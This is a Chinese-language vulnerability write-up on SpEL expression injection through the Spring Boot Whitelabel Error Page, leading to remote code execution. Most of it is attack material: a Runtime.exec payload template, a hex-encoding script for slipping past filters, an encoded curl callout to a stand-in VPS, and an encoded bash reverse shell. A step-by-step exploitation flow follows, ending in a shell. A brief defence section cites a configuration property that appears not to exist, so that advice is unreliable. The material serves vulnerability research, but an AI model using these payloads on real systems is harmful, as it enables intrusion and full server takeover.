---
title: Spring Boot Whitelabel Error Page SpEL 表达式注入
description: 记录 Spring Boot Whitelabel Error Page SpEL 表达式注入原理、影响版本、验证步骤与命令执行 Payload
  构造方法
category: ai-security
tags:
- Spring Boot
- SpEL
- 表达式注入
- Whitelabel Error Page
- RCE
- 漏洞复现
date: 2024-01-15
updated: '2026-11-12'
---

## 漏洞概述

Spring Boot 框架的 Whitelabel Error Page（默认错误页面）在处理参数值出错时，会将用户输入的参数值当作 SpEL (Spring Expression Language) 表达式进行解析执行，导致远程代码执行（RCE）漏洞。

## 漏洞原理

1. **触发入口**：Spring Boot 处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类
2. **递归解析**：URL 中的参数值会被 `parseStringValue` 方法进行递归解析
3. **表达式执行**：被 `${}` 包围的内容会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式解析执行，造成 RCE

## 影响版本

- Spring Boot 1.1.0 - 1.1.12
- Spring Boot 1.2.0 - 1.2.7
- Spring Boot 1.3.0

## 利用条件

- 目标使用上述受影响版本的 Spring Boot
- 至少知道一个触发 Spring Boot 默认错误页面的接口及参数名
- 能够访问该接口并控制参数值

## 验证步骤

### 寻找触发错误页面的接口

寻找正常传参会触发 500 错误并返回 Whitelabel Error Page 的接口。例如：
- 访问 `/article?id=xxx` 返回状态码 500 且显示 Whitelabel Error Page
- 后续 Payload 将在参数 `id` 处尝试注入

### 确认漏洞存在

输入测试 Payload：
```
/article?id=${7*7}
```

如果报错页面中显示计算结果 `49`，则基本确认存在 SpEL 表达式注入漏洞。

![SpEL 验证示例](../Images/3f4782bc0c4f5ab5ebf8129a6229c931.png)

## 命令执行 Payload 构造

### 基础执行模板

```java
${T(java.lang.Runtime).getRuntime().exec("command")}
```

### 字符编码绕过（十六进制编码）

由于某些字符可能被过滤或截断，可将命令转为十六进制字节数组：

```python
# coding: utf-8
result = ""
target = 'curl http://vpsIp:4445'
for x in target:
    result += hex(ord(x)) + ","
print(result.rstrip(','))
```

生成的 Payload 示例：
```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x75,0x72,0x6c,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x76,0x70,0x73,0x49,0x70,0x3a,0x34,0x34,0x34,0x35}))}
```

### 反弹 Shell 示例

```java
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x2f,0x62,0x69,0x6e,0x2f,0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x27,0x62,0x61,0x73,0x68,0x20,0x2d,0x69,0x20,0x3e,0x26,0x20,0x2f,0x64,0x65,0x76,0x2f,0x74,0x63,0x70,0x2f,0x76,0x70,0x73,0x49,0x70,0x2f,0x34,0x34,0x34,0x36,0x20,0x30,0x3e,0x26,0x31,0x27}))}
```

## 实战复现流程

1. **确认目标版本**：通过指纹识别或报错信息确认 Spring Boot 版本在受影响范围内
2. **发现错误接口**：Fuzz 目标站点参数，寻找触发 Whitelabel Error Page 的接口
3. **验证注入点**：使用 `${7*7}` 等算术表达式验证 SpEL 解析
4. **构造执行 Payload**：根据目标环境（Linux/Windows）构造命令执行 Payload
5. **建立反连**：VPS 监听端口，触发 Payload 获取 Shell

## 关联攻击面

该漏洞常与 [[spring-boot-actuator配置不当rce利用]] 中的 `/env`、`/refresh` 端点配合利用：
- 通过 `/env` 修改配置属性触发错误页面
- 结合 SpEL 注入实现无文件落地 RCE

此外，Spring Boot 生态中的 [[h2-console-jndi注入rce利用]]、[[spring-cloud-config目录穿越漏洞]] 等漏洞常并存于同一目标环境，建议综合排查。

## 防御建议

1. **升级版本**：升级至 Spring Boot 1.1.13+、1.2.8+、1.3.1+ 或 2.x 版本
2. **禁用默认错误页**：配置 `server.error.whitelabel.enabled=false` 或自定义错误页面
3. **限制表达式解析**：通过配置 `spring.expression.parser.enabled=false` 禁用 SpEL（如不影响业务）
4. **WAF 规则**：拦截包含 `${...}`、`#{...}` 等 SpEL 语法的请求参数

## 参考资源

- [SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)
- [ShadowFlow123 Blog](https://shadowflow123.github.io/)
- Spring Boot 官方安全公告

## 来源

- [007攻防实验室-202007-202010_6](../sources/007攻防实验室-202007-202010_6.md)
